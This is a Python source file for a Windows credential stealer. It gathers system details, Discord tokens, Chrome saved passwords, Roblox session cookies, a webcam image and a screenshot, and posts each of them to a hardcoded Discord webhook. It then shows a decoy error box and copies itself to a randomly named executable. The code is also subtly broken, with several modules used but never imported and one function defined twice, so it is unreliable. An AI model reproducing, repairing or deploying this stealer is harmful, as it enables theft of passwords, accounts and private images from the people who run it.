
import os
import sys
import json
import time
import shutil
import sqlite3
import win32crypt
import base64
import requests
import threading
import subprocess
from PIL import ImageGrab
from Crypto.Cipher import AES
from datetime import timezone, datetime, timedelta

# Discord webhook URL
webhook_url = "https://discord.com/api/webhooks/1358177392698458368/vxa8zv6b4h_T6MCm9LFjD5Y7ooeTSuWi2GzxmaEZ4151eC_fBm_YmjDtBzZ-Qo9MwBAL"

# Get computer info
def get_system_info():
    try:
        info = {
            'platform': platform.system(),
            'platform-release': platform.release(),
            'platform-version': platform.version(),
            'architecture': platform.machine(),
            'hostname': socket.gethostname(),
            'ip-address': socket.gethostbyname(socket.gethostname()),
            'mac-address': ':'.join(re.findall('..', '%012x' % uuid.getnode())),
            'processor': platform.processor(),
            'ram': str(round(psutil.virtual_memory().total / (1024.0 **3)))+" GB"
        }
        return info
    except Exception as e:
        return str(e)

# Send data to webhook
def send_webhook(data):
    try:
        requests.post(webhook_url, json={'content': f'```json\n{json.dumps(data, indent=4)}\n```'})
    except:
        pass

# Main info gathering
system_info = get_system_info()
send_webhook({'System Info': system_info})

def get_system_info():
    try:
        info = {
            'platform': platform.system(),
            'platform-release': platform.release(),
            'platform-version': platform.version(),
            'architecture': platform.machine(),
            'hostname': socket.gethostname(),
            'ip-address': socket.gethostbyname(socket.gethostname()),
            'mac-address': ':'.join(re.findall('..', '%012x' % uuid.getnode())),
            'processor': platform.processor(),
            'ram': str(round(psutil.virtual_memory().total / (1024.0 **3)))+" GB"
        }
        return info
    except Exception as e:
        return str(e)

system_info = get_system_info()
send_webhook({'System Info': system_info})

def get_discord_tokens():
    tokens = []
    
    paths = {
        'Discord': os.path.join(os.getenv('APPDATA'), 'Discord'),
        'Discord Canary': os.path.join(os.getenv('APPDATA'), 'discordcanary'),
        'Discord PTB': os.path.join(os.getenv('APPDATA'), 'discordptb'),
        'Google Chrome': os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default'),
        'Opera': os.path.join(os.getenv('APPDATA'), 'Opera Software', 'Opera Stable'),
        'Brave': os.path.join(os.getenv('LOCALAPPDATA'), 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default'),
        'Yandex': os.path.join(os.getenv('LOCALAPPDATA'), 'Yandex', 'YandexBrowser', 'User Data', 'Default')
    }
    
    for platform, path in paths.items():
        if not os.path.exists(path):
            continue
            
        tokens.extend(find_tokens(path))
        
    return tokens

def find_tokens(path):
    tokens = []
    
    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue
            
        for line in [x.strip() for x in open(f'{path}\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
                    
    return tokens

tokens = get_discord_tokens()
if tokens:
    send_webhook({'Discord Tokens': tokens})

def get_chrome():
    data = []
    
    path = os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default')
    if not os.path.exists(path):
        return data
        
    login_db = os.path.join(path, 'Login Data')
    if not os.path.exists(login_db):
        return data
        
    shutil.copy2(login_db, 'login_db')
    conn = sqlite3.connect('login_db')
    cursor = conn.cursor()
    
    try:
        cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
        for row in cursor.fetchall():
            if not row[0] or not row[1] or not row[2]:
                continue
                
            password = win32crypt.CryptUnprotectData(row[2], None, None, None, 0)[1].decode()
            if password:
                data.append({
                    'url': row[0],
                    'username': row[1],
                    'password': password
                })
    except:
        pass
        
    cursor.close()
    conn.close()
    
    try:
        os.remove('login_db')
    except:
        pass
        
    return data

chrome_data = get_chrome()
if chrome_data:
    send_webhook({'Chrome Passwords': chrome_data})

def get_roblox_cookie():
    try:
        cookies = []
        
        browsers = [
            [os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default', 'Cookies'), 'Chrome'],
            [os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data', 'Default', 'Cookies'), 'Edge'],
            [os.path.join(os.getenv('APPDATA'), 'Opera Software', 'Opera Stable', 'Cookies'), 'Opera']
        ]
        
        for browser in browsers:
            if not os.path.exists(browser[0]):
                continue
                
            shutil.copy2(browser[0], f'{browser[1]}_cookies')
            conn = sqlite3.connect(f'{browser[1]}_cookies')
            cursor = conn.cursor()
            
            try:
                cursor.execute('SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE "%roblox.com%"')
                for row in cursor.fetchall():
                    if row[1] == '.ROBLOSECURITY':
                        cookie = win32crypt.CryptUnprotectData(row[2], None, None, None, 0)[1].decode()
                        cookies.append({
                            'browser': browser[1],
                            'cookie': cookie
                        })
            except:
                pass
                
            cursor.close()
            conn.close()
            
            try:
                os.remove(f'{browser[1]}_cookies')
            except:
                pass
                
        return cookies
    except:
        return []

roblox_cookies = get_roblox_cookie()
if roblox_cookies:
    send_webhook({'Roblox Cookies': roblox_cookies})

def capture_camera():
    try:
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        cap.release()
        
        if ret:
            cv2.imwrite('camera.png', frame)
            
            with open('camera.png', 'rb') as f:
                files = {'file': ('camera.png', f.read())}
                requests.post(webhook_url, files=files)
                
            os.remove('camera.png')
    except:
        pass

capture_camera()

def open_settings():
    try:
        os.system('start ms-settings:')
    except:
        pass

open_settings()

def take_screenshot():
    try:
        screenshot = ImageGrab.grab()
        screenshot.save('screenshot.png')
        
        with open('screenshot.png', 'rb') as f:
            files = {'file': ('screenshot.png', f.read())}
            requests.post(webhook_url, files=files)
            
        os.remove('screenshot.png')
    except:
        pass

take_screenshot()

def show_error():
    try:
        ctypes.windll.user32.MessageBoxW(0, 'caca', 'proute', 0x10)
    except:
        pass

show_error()

if __name__ == '__main__':
    try:
        if os.path.basename(sys.argv[0]).endswith('.py'):
            new_name = os.path.join(os.getenv('TEMP'), ''.join(random.choices(string.ascii_letters + string.digits, k=10)) + '.exe')
            shutil.copy2(sys.argv[0], new_name)
            subprocess.Popen(new_name)
            sys.exit()
    except:
        pass
